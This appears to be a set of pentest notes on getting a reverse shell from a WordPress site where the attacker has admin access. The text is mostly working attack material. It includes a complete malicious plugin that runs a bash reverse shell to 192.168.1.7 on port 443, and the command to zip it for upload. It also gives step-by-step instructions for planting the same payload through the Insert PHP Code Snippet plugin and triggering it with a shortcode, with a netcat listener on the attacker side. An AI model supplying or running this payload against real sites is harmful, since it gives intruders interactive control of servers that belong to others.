## 🔵 Reverse Shell

## 🟢 Plugin File: Reverse-Shell-Plugin.php

Reverse-Shell-Plugin.php

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Rahul Jain
* Author URI:
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'");

?>
```

## 🟣 Zipping the Plugin

Use the following command to create a ZIP archive of the plugin (required for uploading via WordPress Admin):

```bash
zip Reverse-Shell-Plugin.zip Reverse-Shell-Plugin.php
```

## 🟣 Behavior

When this plugin is installed and activated on a WordPress site, it:

- Launches a **reverse shell** using Bash
- Attempts to connect to **192.168.1.7 on TCP port 443**
- Gives the remote attacker **interactive shell access**

## 🟢 Reverse Shell via Insert PHP Code Snippet Plugin

## 🟣 Requirements

- WordPress admin access
- Plugin: **Insert PHP Code Snippet**
- Attacker machine (e.g., Kali Linux)
- Netcat or similar tool

---

## 🟣 Step-by-Step: Reverse Shell Execution

## 🎯 Step 1: Set Up a Listener (Attacker Machine)

On your attacker machine, run:

```bash
nc -lvnp 443
```

This listens for incoming connections on port **443**.

---

## 🔧 Step 2: Create the PHP Snippet in WordPress

### 1. Navigate to:

```
WordPress Admin → XYZ PHP Code → Add New PHP Code Snippet
```

### 2. Name the snippet (e.g., Reverse Shell)

### 3. Add the following code:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'");
?>
```

Replace **192.168.1.7** with your actual attacker's IP if different.

### 4. Save the snippet. You'll receive a shortcode like:

```
[xyz-ips snippet="Reverse Shell"]
```

---

## 🟢 Step 3: Trigger the Shell

### 1. Create a new post or page in WordPress

### 2. Paste the shortcode:

```
[xyz-ips snippet="Reverse Shell"]
```

### 3. Publish and **visit the page in your browser**

If everything is set up correctly, you should receive a reverse shell connection on your Netcat listener.
